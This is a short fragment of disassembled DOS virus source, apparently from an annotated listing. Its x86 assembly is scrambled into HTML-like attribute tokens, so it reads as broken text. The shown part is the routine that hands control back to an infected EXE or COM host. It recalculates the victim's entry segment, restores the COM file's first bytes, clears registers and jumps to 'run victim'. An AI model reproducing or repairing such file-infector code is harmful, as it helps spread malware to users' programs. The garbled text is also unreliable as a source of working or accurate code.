				;<- exe="" pop="" ds="" ;entry="" ds="" ;04c8="" 1f="" mov="" ax,cs:[si-366h]="" ;="026h" virus="" segment="" ;04c9="" 2e:="" 8b="" 84="" fc9a="" mov="" bx,cs:[si-368h]="" ;="024h" victim="" entry="" cs="" ;04ce="" 2e:="" 8b="" 9c="" fc98="" push="" cs="" ;04d3="" 0e="" pop="" cx="" ;04d4="" 59="" sub="" cx,ax="" ;reloc="" value="" ;04d5="" 2b="" c8="" add="" cx,bx="" ;victim="" entry="" cs="" ;04d7="" 03="" cb="" push="" cx="" ;04d9="" 51="" push="" word="" ptr="" cs:[si-36ah]="" ;="0022h" victim="" entry="" ip="" ;04da="" 2e:="" ff="" b4="" fc96="" push="" ds="" ;04df="" 1e="" pop="" es="" ;04e0="" 07="" call="" s_0379="" ;clear="" all="" registers="" ;04e1="" e8="" fe95="" retf="" ;run="" victim="" ;04e4="" cb=""></-><- com="" l_04e5:="" pop="" ax="" ;entry="" ds="" ;04e5="" 58="" mov="" ax,cs:[si-382h]="" ;="000A" ;04e6="" 2e:="" 8b="" 84="" fc7e="" mov="" word="" ptr="" cs:[100h],ax="" ;04eb="" 2e:="" a3="" 0100="" mov="" ax,cs:[si-380h]="" ;="000C" ;04ef="" 2e:="" 8b="" 84="" fc80="" mov="" word="" ptr="" cs:[102h],ax="" ;04f4="" 2e:="" a3="" 0102="" mov="" ax,100h="" ;com="" entry="" point="" ;04f8="" b8="" 0100="" push="" ax="" ;04fb="" 50="" push="" cs="" ;04fc="" 0e="" pop="" ds="" ;04fd="" 1f="" push="" ds="" ;04fe="" 1e="" pop="" es="" ;04ff="" 07="" call="" s_0379="" ;clear="" all="" registers="" ;0500="" e8="" fe76="" retn="" ;run="" victim="" ;0503="" c3="" seg_b="" ends="" end="" start="" =""></-></-></-></->